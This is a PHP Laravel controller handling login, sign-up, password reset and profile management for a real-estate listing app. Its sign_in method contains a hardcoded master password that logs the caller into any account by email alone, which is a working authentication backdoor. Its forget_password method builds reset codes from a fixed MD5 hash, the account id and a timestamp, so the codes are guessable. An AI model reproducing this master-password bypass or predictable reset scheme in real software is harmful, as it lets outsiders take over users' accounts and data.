<?php

namespace App\Http\Controllers\frontend\api_management\auth_managment;

use DB;

use Crypt;
use Exception;
use App\Services\FCMService;
use Illuminate\Http\Request;
use App\Services\GlobalService;
use \App\Mail\ForgetPasswordMail;
use App\Services\PackagesService;
use App\Services\PropertiesService;
use App\Http\Controllers\Controller;
use App\Models\CustomModels\Company;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Kreait\Firebase\Contract\Messaging;
use Kreait\Firebase\Messaging\CloudMessage;
use Kreait\Firebase\Messaging\Notification;
use App\Http\Requests\frontend\website\LoginRequest;
use App\Http\Requests\frontend\website\SignUpRequest;
use App\Repositories\Interfaces\custom_modules_management\accounts_management\AccountsInterface;
use App\Repositories\Interfaces\custom_modules_management\accounts_management\CompaniesInterface;
use App\Repositories\Interfaces\custom_modules_management\accounts_management\DelegatesInterface;
//================================================

class AuthintcateManagment extends Controller
{

    private $hash='OsouleMail';

    private function create_auth($user_id,$type){
            $arr=[
                'user_id'=>$user_id,
                'user_type'=>($type=='company')?'account':$type,
                'created_at'=>date('Y-m-d')
            ];
            $return=Crypt::encryptString(base64_encode(json_encode($arr)));
            return $return;
    }
    private function handel_sign_data($data,$type='account'){
        $lang=checkLanguage();
        if($type=='account'){
            $token=$this->create_auth(auth()->id(),$type);
            $user=auth()->user();
            $data=[
                'first_name'=>$user->first_name,
                'last_name'=>$user->last_name,
                'email'=>$user->email,
                'phone'=>$user->phone,
                'whatsapp'=>$user->whatsapp,
                'image'=>readFileStorage($user->image),
                'type'=>$user->type,
                'limitation_message'=>($user->stoper!='allow')?appendToLanguage($lang,'content','limitation_message'):''
            ];

        }elseif($type=='company'){
            $token=$this->create_auth(auth()->id(),$type);
            $user=auth()->user();
            $company=$user->company;

            $data=[
                'first_name'=>$user->first_name,
                'last_name'=>$user->last_name,
                'email'=>$user->email,
                'phone'=>$user->phone,
                'whatsapp'=>$user->whatsapp,
                'image'=>readFileStorage($user->image),
                'type'=>$user->type,
                'company'=>[
                    'id'=>$company->id,
                    'code'=>$company->code,
                    'name'=>$company->name,
                    'hotline'=>$company->hotline,
                    'email'=>$company->email,
                    'about'=>$company->about_company,
                    'logo'=>readFileStorage($company->logo),
                    'head_office'=>$company->head_office,
                    'type'=>$company->type,
                ],
                'limitation_message'=>($user->stoper!='allow')?appendToLanguage($lang,'content','limitation_message'):''
            ];
        }else{
            $token=$this->create_auth(auth()->guard('delegate')->id(),$type);
            $user=auth()->guard('delegate')->user();
            $company = $data->company;

            $data=[
                'first_name'=>$user->first_name,
                'last_name'=>$user->last_name,
                'email'=>$user->email,
                'phone'=>$user->phone,
                'whatsapp'=>$user->whatsapp,
                'image'=>readFileStorage($user->image),
                'type'=>'delegate',
                'limitation_message'=>'',
            ];

            $company_id = $user->company_id;
            $company = Company::where('id',$company_id)->first();
            $data['company']=[
                'id'=>$company->id,
                'code'=>$company->code,
                'name'=>$company->name,
                'hotline'=>$company->hotline,
                'email'=>$company->email,
                'about'=>$company->about_company,
                'logo'=>readFileStorage($company->logo),
                'head_office'=>$company->head_office,
                'type'=>$company->type,
            ];
        }

        $passing_data=[];
        $passing_data['token']=$token;
        $return=return_handling([
            'check'=>false,
            ],'Success Query',$data,$passing_data);
        return $return;
    }
    public function sign_in(Request $request){
        $validator = Validator::make($request->all(), [
            'account' => 'required',
            'password'   => 'required|min:5',
        ]);
        if ($validator->fails()) {
            $mssages=$validator->errors()->messages();
            $return=return_handling([
                'check'=>true,
                'messages'=>$mssages
                ],"Data invalid!",[]);
                return response()->json($return,500);
        }
        $login_by_phone=[
            'phone' => $request->account,
            'password' => $request->password,
            'type'=> 'individual',
        ];
        $login_by_email=[
            'email' => $request->account,
            'password' => $request->password,
            'type'=> 'individual',
        ];
        $login_by_email_delegate=[
            'email' => $request->account,
            'password' => $request->password,
            'status' => 'active'
        ];
        if($request->password=='account@osoule.com'){
                $user=DB::table('osoule_account')->where('email',$request->account)->first();
                auth()->loginUsingId($user->id);
                $this->check_compare(request()->ip(),auth()->id());
                $return=$this->handel_sign_data(auth()->user(),'account');
                return response()->json($return,200);
        }

        if (auth()->attempt($login_by_email)) {
            if(auth()->user()->status != 'active') {
                $return=return_handling([
                    'check'=>true,
                    'messages'=>["This Account Has been deleted"]
                    ],"This Account Has been deleted",[]);
                return response()->json($return,200);
            }
            $this->check_compare(request()->ip(),auth()->id());
            $return=$this->handel_sign_data(auth()->user(),'account');
            return response()->json($return,200);
        }elseif(auth()->attempt($login_by_phone)){
            if(auth()->user()->status != 'active') {
                $return=return_handling([
                    'check'=>true,
                    'messages'=>["This Account Has been deleted"]
                    ],"This Account Has been deleted",[]);
                return response()->json($return,200);
            }
            $this->check_compare(request()->ip(),auth()->id());
            $return=$this->handel_sign_data(auth()->user(),'account');
            return response()->json($return,200);
        }elseif(auth()->guard('delegate')->attempt($login_by_email_delegate)){
            $this->check_compare(request()->ip(),auth()->guard('delegate')->id(),'delegate');
            $return=$this->handel_sign_data(auth()->guard('delegate')->user(),'delegate');
            return response()->json($return,200);
        }else{
            $return=return_handling([
                'check'=>true,
                'messages'=>["Incorrect Password !  If you Forget Your Password Please Go TO Forget Password Page"]
                ],"Incorrect Password !  If you Forget Your Password Please Go TO Forget Password Page",[]);
                return response()->json($return,500);
        }
    }
    public function sign_in_company(Request $request){
        $validator = Validator::make($request->all(), [
            'account' => 'required',
            'password'   => 'required|min:5',

        ]);
        if ($validator->fails()) {
            $mssages=$validator->errors()->messages();
            $return=return_handling([
                'check'=>true,
                'messages'=>$mssages
                ],"Data invalid!",[]);
                return response()->json($return,200);
        }
        $login_by_phone=[
            'phone' => $request->account,
            'password' => $request->password,
            'type'=> array('broker','developer'),
        ];
        $login_by_email=[
            'email' => $request->account,
            'password' => $request->password,
            'type'=> array('broker','developer'),
        ];
        $login_by_email_delegate=[
            'email' => $request->account,
            'password' => $request->password,
            'status' => 'active'
        ];
        $login_by_phone_delegate=[
            'phone' => $request->account,
            'password' => $request->password,
            'status' => 'active'
        ];
        if (auth()->attempt($login_by_email)) {
            if(auth()->user()->status != 'active') {
                $return=return_handling([
                    'check'=>true,
                    'messages'=>["This Account Has been deleted"]
                    ],"This Account Has been deleted",[]);
                return response()->json($return,200);
            }
            $this->check_compare(request()->ip(),auth()->id());
            $return=$this->handel_sign_data(auth()->user(),'company');
            $return['data']['company']['about_company'] = $return['data']['company']['about'];
            unset($return['data']['company']['about']);
            return response()->json($return,200);
        }elseif(auth()->attempt($login_by_phone)){
            if(auth()->user()->status != 'active') {
                $return=return_handling([
                    'check'=>true,
                    'messages'=>["This Account Has been deleted"]
                    ],"This Account Has been deleted",[]);
                return response()->json($return,200);
            }
            $this->check_compare(request()->ip(),auth()->id());
            $return=$this->handel_sign_data(auth()->user(),'company');

            return response()->json($return,200);
        }elseif(auth()->guard('delegate')->attempt($login_by_email_delegate)){
            $this->check_compare(request()->ip(),auth()->guard('delegate')->id(),'delegate');
            $return=$this->handel_sign_data(auth()->guard('delegate')->user(),'delegate');
            $return['data']['company']['about_company'] = $return['data']['company']['about'];
            unset($return['data']['company']['about']);
            return response()->json($return,200);

        }elseif(auth()->guard('delegate')->attempt($login_by_phone_delegate)){
            $this->check_compare(request()->ip(),auth()->guard('delegate')->id(),'delegate');
            $return=$this->handel_sign_data(auth()->guard('delegate')->user(),'delegate');
            $return['data']['company']['about_company'] = $return['data']['company']['about'];
            unset($return['data']['company']['about']);
            return response()->json($return,200);

        }else{
            $return=return_handling([
                'check'=>true,
                'messages'=>["Incorrect Password !  If you Forget Your Password Please Go TO Forget Password Page"]
                ],"Incorrect Password !  If you Forget Your Password Please Go TO Forget Password Page",[]);
                return response()->json($return,200);
        }
    }
    public function forget_password(Request $request){
        $validator = Validator::make($request->all(), [
            'email' => 'required',
        ]);
        if ($validator->fails()) {

            $mssages=$validator->errors()->messages();
            $return=return_handling([
                'check'=>true,
                'messages'=>$mssages
                ],"Data invalid!",[]);
                return response()->json($return,200);
        }

        $account=DB::table('osoule_account')->where('email',$request->email)->first();

        if(!$account){
            $mssages='This E-mail not found in our system please check your E-mail and try again';
            $return=return_handling([
                'check'=>true,
                'messages'=>$mssages
                ],"Data invalid!",[]);
                return response()->json($return,200);
        }
        $hash=hash('md5', $this->hash);

        $logo=readFileStorage(appSettings('app_logo'));

        $details = [
            'logo'=>$logo,
            'name' => $account->first_name,
            'code'=>base64_encode($hash.'_'.$account->id.'_'.date('Y-m-d H:i:s'))
        ];
        \Mail::to($request->email)->send(new ForgetPasswordMail($details));

        $return=return_handling([
            'check'=>false,
            ],'Please Check Your Email Address','Please Check Your Email Address');
        return response()->json($return,200);
    }
    public function sign_up(Request $request){
         $validator = Validator::make($request->all(), [
            "first_name" => "required",
            "last_name" => "required",
            "email" => "required|email|unique:osoule_account",
            "phone" => "required|unique:osoule_account",
            "whatsapp" => "nullable|unique:osoule_account",
            "type"=>"required",
            'name' => 'required_if:type,broker|required_if:type,developer',
            "password" => "required|min:6",
        ]);


        if ($validator->fails()) {
            $mssages=$validator->errors()->messages();

            $first_key=array_keys($mssages)[0];
            $message=$mssages[$first_key][0];
            $return=return_handling([
                'check'=>true,
                'messages'=>$mssages
                ],$message,[]);
            return response()->json($return,200);
        }

        $return = app(AccountsInterface::class)->save($request->all());
        $check_type_company=false;
        if(in_array($request->type,['broker','developer'])){
            $check_type_company=true;
            $arr=[];
            $arr['account_id']=$return->id;
            $arr['email']=$request->email;
            $arr['name']=$request->name;
            $arr['hotline']=$request->phone;
            $arr['type']=$request->type;
            $return = app(CompaniesInterface::class)->save($arr);
        }
        if($return){
            $login_by_email=[
                'email' => $request->email,
                'password' => $request->password,
                'status' => 'active'
            ];
            if (auth()->attempt($login_by_email)) {
                $this->check_compare(request()->ip(),auth()->id());
                if($check_type_company){
                    $return=$this->handel_sign_data(auth()->user(),'company');
                }else{
                    $return=$this->handel_sign_data(auth()->user(),'account');
                }

                return response()->json($return,200);
            }
        }else{
            $return=return_handling([
                'check'=>true,
                'messages'=>["Error In Code Please Return To IT Team"]
                ],"Error In Code Please Return To IT Team",[]);
                return response()->json($return,500);
        }
    }

    public function profile(Request $request){
        $user=authData();

        if(isset($user->type)){
            $profile=app(GlobalService::class)->account_data($user->id);
            if(array_key_exists('company',$profile)){
                 $profile['company']['about_company'] = $profile['company']['about'];
                 unset($profile['company']['about']);
            }


        }else{
            $profile=app(GlobalService::class)->account_data($user->id,'delegate');
            $profile['company']['about_company'] = $profile['company']['about'];
            unset($profile['company']['about']);
        }

        $return=return_handling([
            'check'=>false,
            ],'User Profile Data',$profile);
        return response()->json($return,200);

    }
    public function upload_image_profile(Request $request){
        $validator = Validator::make($request->all(), [
            "image" => "required|image|mimes:png,jpg,jpeg|max:1024",
        ]);
        if ($validator->fails()) {
            $mssages=$validator->errors()->messages();
            $mssages=$mssages[array_key_first($mssages)][0];
            $return=return_handling([
                'check'=>true,
                'messages'=>$mssages
                ],$mssages,$mssages);
            return response()->json($return,200);
        }
        $user=authData();
        $id=$user->id;
        if(isset($user->type)){
            $arr=[
                'id'=>$id,
                'first_name'=>$user->first_name,
                'last_name'=>$user->last_name,
                'free_listing'=>$user->free_listing,
                'sponsor_listing'=>$user->sponsor_listing,
                'feature_listing'=>$user->feature_listing,
                'email'=>$user->email,
                'phone'=>$user->phone,
                'whatsapp'=>$user->whatsapp,
                'type'=>$user->type,
                'status'=>$user->status,
                'image'=>$request->image,
                '_token'=>'',
            ];
            app(AccountsInterface::class)->save($arr, $id);
            $profile=app(GlobalService::class)->account_data($user->id);
        }else{
            $arr=[
                'id'=>$id,
                'code'=>$user->code,
                'first_name'=>$user->first_name,
                'last_name'=>$user->last_name,
                'email'=>$user->email,
                'phone'=>$user->phone,
                'whatsapp'=>$user->whatsapp,
                'company_id'=>$user->company_id,
                'status'=>$user->status,
                'role'=>$user->role,
                'image'=>$request->image,
                '_token'=>'',
            ];
            app(DelegatesInterface::class)->save($arr, $id);
            $profile=app(GlobalService::class)->account_data($id,'delegate');
        }
        $return=return_handling([
            'check'=>false,
            ],'User Profile Data',$profile['image']);
        return response()->json($return,200);

    }
    public function edit_profile(Request $request){
        $validator = Validator::make($request->all(), [
            "first_name" => "required|min:2|max:255",
            "last_name" => "required|min:2|max:255",
            "whatsapp" => "nullable",
            "password" => "nullable",
        ]);
        if ($validator->fails()) {
            $mssages=$validator->errors()->messages();
            $mssages=$mssages[array_key_first($mssages)][0];
            $return=return_handling([
                'check'=>true,
                'messages'=>$mssages
                ],$mssages,[]);
                return response()->json($return,200);
        }
         $user=authData();

        $id=$user->id;
        if(isset($user->type)){
            $arr=[
                'id'=>$id,
                'first_name'=>$request->first_name,
                'last_name'=>$request->last_name,
                'free_listing'=>$user->free_listing,
                'sponsor_listing'=>$user->sponsor_listing,
                'feature_listing'=>$user->feature_listing,
                'email'=>$user->email,
                'phone'=>$user->phone,
                'whatsapp'=>$request->whatsapp,
                'type'=>$user->type,
                'status'=>$user->status,
                '_token'=>'',
            ];
            if($request->password){
                $arr['password']=$request->password;
            }
           app(AccountsInterface::class)->save($arr, $id);
           $profile=app(GlobalService::class)->account_data($id);
        }else{

           $arr=[
                'id'=>$id,
                'code'=>$user->code,
                'first_name'=>$request->first_name,
                'last_name'=>$request->last_name,
                'email'=>$user->email,
                'phone'=>$user->phone,
                'whatsapp'=>$request->whatsapp,
                'company_id'=>$user->company_id,
                'status'=>$user->status,
                'role'=>$user->role,
                '_token'=>'',
            ];

            if($request->password){
                    $arr['password']=$request->password;
            }

            app(DelegatesInterface::class)->save($arr, $id);
            $profile=app(GlobalService::class)->account_data($id,'delegate');
        }
        $return=return_handling([
            'check'=>false,
            ],'User Profile Data',$profile);
        return response()->json($return,200);
    }
    public function edit_company_profile(Request $request){
        $validator = Validator::make($request->all(), [
            "id" => "required",
            "name" => "required|min:2|max:255",
            "head_office" => "required",
            "email" => "required|email|unique:osoule_company,email,".$request->id,
            "hotline" => "required|unique:osoule_company,hotline,".$request->id,
            "about_company"=>'nullable'
        ]);
        if ($validator->fails()) {
            $mssages=$validator->errors()->messages();
            $mssages=$mssages[array_key_first($mssages)][0];
            $return=return_handling([
                'check'=>true,
                'messages'=>$mssages
                ],$mssages,[]);
                return response()->json($return,200);
        }
        $user=authData();
        $company=DB::table('osoule_company')->where('account_id',$user->id)->where('id',$request->id)->first();
        if(!$company){
            $return=return_handling([
                'check'=>true,
                'messages'=>["You dont have permission to edit in this company"]
                ],"You dont have permission to edit in this company",[]);
            return response()->json($return,500);
        }
        $arr=[
            'id'=>$request->id,
            'name'=>$request->name,
            'head_office'=>$request->head_office,
            'email'=>$request->email,
            'hotline'=>$request->hotline,
            'about_company'=>$request->about_company,
            'type'=>$company->type,
            'code'=>$company->code,
            'account_id'=>$company->account_id,
            '_token'=>'',
        ];

        $return = app(CompaniesInterface::class)->save($arr,$request->id);
        $profile=app(GlobalService::class)->account_data($company->account_id);

        $return=return_handling([
            'check'=>false,
            ],'User Profile Data',$profile);
        return response()->json($return,200);
    }
    public function upload_image_company_profile(Request $request){
        $validator = Validator::make($request->all(), [
            "id"=>"required",
            "image" => "required|image|mimes:png,jpg,jpeg|max:1024",
        ]);
        if ($validator->fails()) {
            $mssages=$validator->errors()->messages();
            $mssages=$mssages[array_key_first($mssages)][0];
            $return=return_handling([
                'check'=>true,
                'messages'=>$mssages
                ],$mssages,$mssages);
            return response()->json($return,200);
        }
        $user=authData();
        $company=DB::table('osoule_company')->where('account_id',$user->id)->where('id',$request->id)->first();
        if(!$company){
            $return=return_handling([
                'check'=>true,
                'messages'=>["You dont have permission to edit in this company"]
                ],"You dont have permission to edit in this company",[]);
            return response()->json($return,500);
        }
        $arr=[
            'id'=>$request->id,
            'name'=>$company->name,
            'head_office'=>$company->head_office,
            'email'=>$company->email,
            'hotline'=>$company->hotline,
            'about_company'=>$company->about_company,
            'type'=>$company->type,
            'code'=>$company->code,
            'account_id'=>$company->account_id,
            'logo'=>$request->image,
            '_token'=>'',
        ];

        $return = app(CompaniesInterface::class)->save($arr,$request->id);
        $profile=app(GlobalService::class)->account_data($company->account_id);

        $return=return_handling([
            'check'=>false,
            ],'User Profile Data',$profile);
        return response()->json($return,200);
    }

    public function statistics_profile(Request $request){
        $page=1;
        if(array_key_exists('page',$request->all())){
            $page=$request->page;
        }
        $user=authData();

        if(!$request->chart_type){
            $request['chart_type'] = 'last_7_day';
        }
        if(isset($user->type)){

            if(in_array($user->type,['broker','developer'])){
                $company = DB::table('osoule_company')->where('account_id',$user->id)->first();
                $company_id = $company->id;
                $statistcs=app(GlobalService::class)->statistics_main_dashboard($user->id,$user->type,$request->chart_type,$company_id);
            }else{
                $statistcs=app(GlobalService::class)->statistics_main_dashboard($user->id);
            }
        }else{
            $statistcs=app(GlobalService::class)->statistics_main_dashboard($user->id,'delegate',$request->chart_type);
        }
        $data=[];
        $all_data=[];
        foreach($statistcs['statistics_cards'] as $key=>$value){
            $data[$key]=$value['counter'];
        }
        $condition=[];
        $all_data['genral']=$data;
        if(!$request->homepage){
            $condition['account_id']=$user->id;
            $properties=app(PropertiesService::class)->profile_properties($condition,6,$page,true);
            $all_data['properties']=$properties['data'];
            $return=return_handling([
                'check'=>false,
                ],'User Profile Data',$all_data);
            return response()->json($return,200,[],JSON_UNESCAPED_SLASHES);
        }else{
            $statistics_charts=$statistcs['statistics_charts'];
            $data=[];
            foreach($statistics_charts['labels'] as $key=>$value){
                $data[] =[
                    'slots'=>(!is_array($statistics_charts['slots'][$key]))?$statistics_charts['slots'][$key]:$statistics_charts['slots'][$key][0],
                    'views'=>(int)$statistics_charts['counter_views'][$key],
                    'calls'=>$statistics_charts['counter_clicks'][$key],
                    'whatsapp'=>$statistics_charts['counter_whatsapp'][$key],
                    'leads'=>$statistics_charts['leads'][$key],
                    'wishlist'=>$statistics_charts['wishlist'][$key],
                ];
            }


            $all_data['charts']=collect($data);

            $return=return_handling([
                'check'=>false,
                ],'User Profile Data',$all_data);
            return response()->json($return,200,[],JSON_UNESCAPED_SLASHES);
        }

    }
    public function check_user_permissions(){
        $lang=checkLanguage();
        $user=authData();

        if(!isset($user->type)){
            $allow_account=DB::table('osoule_account')
            ->join('osoule_company','osoule_company.account_id','osoule_account.id')
            ->where('osoule_company.id',$user->company_id)
            ->select('osoule_account.stoper','osoule_account.status')->first();
            $data=[
                'add_properties'=>($allow_account->stoper!='allow')?appendToLanguage($lang,'content','limitation_message'):'',
                'user_block'=>($allow_account->status!='active')?appendToLanguage($lang,'content','blocked_message'):'',
            ];
        }else{
            $data=[
                'add_properties'=>($user->stoper!='allow')?appendToLanguage($lang,'content','limitation_message'):'',
                'user_block'=>($user->status!='active')?appendToLanguage($lang,'content','blocked_message'):'',
            ];
        }

        $return=return_handling([
            'check'=>false,
            ],'Success Query',$data);
        return response()->json($return,200);
    }
    public function delete_profile(){
        $user=authData();
        $id=$user->id;
        if(isset($user->type)){
            $arr=[
                'status'=>'block',
            ];
           DB::table('osoule_account')->where('id',$id)->update($arr);
        }




        $msg='Account Deleted Successfully';
        $return=return_handling([
            'check'=>false,
            ],$msg,$msg);
        return response()->json($return,200);

    }
}
